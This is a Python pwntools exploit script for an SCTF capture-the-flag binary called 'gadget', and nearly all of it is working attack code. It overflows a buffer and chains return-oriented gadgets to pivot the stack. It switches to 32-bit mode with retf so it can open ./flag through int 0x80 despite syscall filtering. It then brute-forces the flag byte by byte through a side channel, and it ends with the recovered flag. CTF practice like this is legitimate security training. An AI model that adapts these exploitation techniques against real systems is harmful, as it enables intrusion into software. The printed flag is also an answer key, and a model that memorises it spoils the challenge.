from pwn import *

#context.log_level = True
context.timeout=8
context.log_level = "debug"
# if args.Q:
#     p=remote("121.37.135.138", 2102)
# else:
#p = process("./gadget")

'''
0x00000000004011c1 : mov rdi, rbx ; push r14 ; ret
0x000000000040119f : mov eax, dword ptr [rbp - 0xc] ; pop rbp ; ret
0x0000000000401000 : push rax ; pop rax ; ret
0x0000000000401191 : mov rsi, qword ptr [rbp - 0x18] ; mov edx, 0xc0 ; syscall
0x0000000000401162 : mov edi, dword ptr [rbp - 8] ; syscall ; pop rbp ; retn
0x0000000000406adb : xchg dword ptr [rdi], ecx ; ret
0x0000000000403815 : push rcx ; retf
0x0000000000403beb : mov qword ptr [rdi + rdx - 0x27], rax ; mov rax, rdi ; ret
0x000000000040a146 : cmp byte ptr [rax], ch ; jne 0x40a124 ; mov eax, 0xd4b0c388 ; jmp 0x40a124
0x0000000000408266 : cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069
0x0000000000405831 : jne 0x40583c ; mov rax, rdi ; ret
0x0000000000408853 : jne 0x408852 ; ret
0x0000000000401193 : jne 0x401184 ; mov edx, 0xc0 ; syscall
'''
retf_addr = 0x4011ed
pop_rax = 0x401001
pop_rdi_rbp = 0x401734
pop_rsi_r15_rbp = 0x401732
syscall_addr = 0x401165
int80h_addr = 0x4011F3
bss_addr = 0x40ca00
pop_rsp_r14_r15_rbp = 0x401730
pop_rbx_r14_r15_rbp = 0x403072
pop_rcx = 0x40117b
mov_rsi_r15_mov_rdx_r12_call_r14 = 0x402c04
pop_r12_r14_r15_rbp = 0x40172f
pop_rbp = 0x401102
get_ecx = 0x40119f
cmp_ret = 0x408266
jne_ret = 0x408853
sub_rcx_esi_jne_ret= 0x0000000000403f14
# payload = b"a" * 0x38 + p64(pop_rax) + p64(0) + p64(pop_rdi_rbp) + p64(0) + p64(bss_addr+0x10) + p64(pop_r12_r14_r15_rbp) + p64(0x300) + p64(syscall_addr) + p64(bss_addr) + p64(bss_addr+0x10) + p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_r14_r15_rbp) + p64(bss_addr+0x10)
# p.send(payload)
# offset=0x66+0x41
# rop = b"./flag".ljust(0x10, b"\x00") + p64(bss_addr+0x10) * 3 + p64(pop_rbx_r14_r15_rbp) + p64(bss_addr) + p64(bss_addr+0x10) * 3 + p64(pop_rcx) + p64(0) + p64(pop_rax) + p64(5) + p64(retf_addr) + p32(int80h_addr) + p32(0x23) + p32(retf_addr) + p32(pop_rdi_rbp) + p32(0x33) + p64(3) + p64(bss_addr+0x10) + p64(pop_rsi_r15_rbp) + p64(bss_addr+offset) * 3 + p64(pop_rax) + p64(0) + p64(syscall_addr) + p64(jne_ret) + p64(pop_rcx) + p64(bss_addr+offset) +p64(pop_rbx_r14_r15_rbp) +p64(bss_addr+offset-0x41)*4+ p64(sub_rcx_esi_jne_ret) +p64(0)*3+p64(0x0000000000401077) +p64(0x405837)
# p.send(rop)
flag=""
loop=0x405837
def exp(p,num,kum):
    #gdb.attach(p)
    payload = b"a" * 0x38 + p64(pop_rax) + p64(0) + p64(pop_rdi_rbp) + p64(0) + p64(bss_addr+0x10) + p64(pop_r12_r14_r15_rbp) + p64(0x300) + p64(syscall_addr) + p64(bss_addr) + p64(bss_addr+0x10) + p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_r14_r15_rbp) + p64(bss_addr+0x10)
    p.sendline(payload)
    offset=num+0x41
    rop = b"./flag".ljust(0x10, b"\x00") + p64(bss_addr+0x10) * 3 + p64(pop_rbx_r14_r15_rbp) + p64(bss_addr) + p64(bss_addr+0x10) * 3 + p64(pop_rcx) + p64(0) + p64(pop_rax) + p64(5) + p64(retf_addr) + p32(int80h_addr) + p32(0x23) + p32(retf_addr) + p32(pop_rdi_rbp) + p32(0x33) + p64(3) + p64(bss_addr+0x10) + p64(pop_rsi_r15_rbp) + p64(bss_addr+offset-kum) * 3 + p64(pop_rax) + p64(0) + p64(syscall_addr) + p64(0) + p64(pop_rcx) + p64(bss_addr+offset) +p64(pop_rbx_r14_r15_rbp) +p64(bss_addr+offset-0x41)*4+ p64(sub_rcx_esi_jne_ret) +p64(0)*3+p64(pop_rax)+p64(0x405614)+p64(0x0000000000401077) +p64(loop)
    #p64(pop_rax) + p64(0) + p64(pop_rdi_rbp) + p64(0) + p64(bss_addr+0x10) + p64(pop_r12_r14_r15_rbp) + p64(0x300) + p64(syscall_addr)+p64(bss_addr) + p64(bss_addr+0x10) + p64(mov_rsi_r15_mov_rdx_r12_call_r14)
    #gdb.attach(p, "b* 0x0000000000403f14")
    #sleep(1)
    p.sendline(rop)
    print(p.recv())
    #pause()
if __name__=="__main__":
    for i in range(5,128):
        print(i)
        for j in range(0x31,127):
            #p=remote("121.37.135.138", 2102)
            p=process('./gadget')
            try:
                exp(p,j,i)
                flag=flag+chr(j)
                print("flag:"+flag)
                p.close()
                continue
            except:
                p.close()
                continue
#SCTF{woww0w_y0u_1s_g4dget_m45ter}